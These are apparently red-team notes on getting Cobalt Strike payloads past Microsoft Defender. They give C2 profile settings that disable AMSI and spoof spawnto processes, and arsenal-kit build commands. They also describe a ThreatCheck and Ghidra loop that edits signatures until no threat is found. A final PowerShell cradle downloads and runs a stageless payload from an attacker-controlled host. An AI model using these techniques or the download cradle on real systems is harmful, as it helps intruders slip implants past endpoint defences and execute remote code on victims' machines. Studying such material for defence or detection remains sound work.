# Checking for the latest Defender heat

```bash
# Checking for error messages
net helpmsg <error-number>

# Checking for defender heat
Get-MpThreatDetection | sort $_.InitialDetectionTime | select -First 1

# We might get one of the following
- [file] (On-disk): meaning that there was a static check and the it was caught on signature level
- [behaviour] (Behavioural): meaning that the binary was caught in the memory of a process
- [amsi] (In-Memory): meaning that the binary was caught in memory

# Recommemded settings in the C2 profile

-- For reflective loader/beacon DLL bypass --
stage {
        set userwx "false";
        set cleanup "true";
        set obfuscate "true";
        set module_x64 "xpsservices.dll";

}


-- For AMSI post exploitation bypass (applies to powerpick, execute-assembly and psinject) --
vim c2-profiles/normal/webbug.profile

post-ex {
        set amsi_disable "true";
}

./c2lint c2-profiles/normal/webbug.profile


-- To Bypass Behavioral detections

post-ex {
        set amsi_disable "true";

        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}
```

---

# Checking and recompiling binaries

```bash
# 1. First go to the artifacts and use the build.sh to build the artifacts (linux)
cd /mnt/C/Tools/cobaltstrike/arsenal-kit/kits/artifact
./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts

# 2. Now we use powershell to check the binaries static signatures (windows)
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe

# 3. Copy the last hex line and check the code in Ghidra (windows)
 C:\Tools\ghidra-10.3.1\ghidraRun.bat

# 4. Create a project > select import file, import one of the binaries (analizeJ) > search (paste hex) > search all

# 5. Once we know where it is, open the artifacts project and change the code where the signature is being catched

# 6. Repeat the process until [No threat found!]

# 7. In Cobal strike go to [Cobalt Strike] > [Script Manager] and select the created [artifact.cna]
```

---

# Powershell AMSI detection bypass

```bash
# Run smb.ps1 locally and let it get caught to check detection reason (windows)
Get-MpThreatDetection | sort $_.InitialDetectionTime | select -First 1

# Check where is getting caught, change the ps1 accordingly until you get clean file (windows)
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.ps1 -e amsi

# To make permanent changes go to C:\Tools\cobaltstrike\arsenal-kit\kits\resource (windows)
code template.x64.ps1

# Update the changes and build the resources again (linux)
./build.sh /mnt/c/Tools/cobaltstrike/resources

# In Cobal strike go to [Cobalt Strike] > [Script Manager] and select the created [resource.cna] (windows)

# host your stageless PowerShell payload directly via Site Management > Host File (windows)
iex (new-object net.webclient).downloadstring("http://10.10.5.50/a2")
```

---
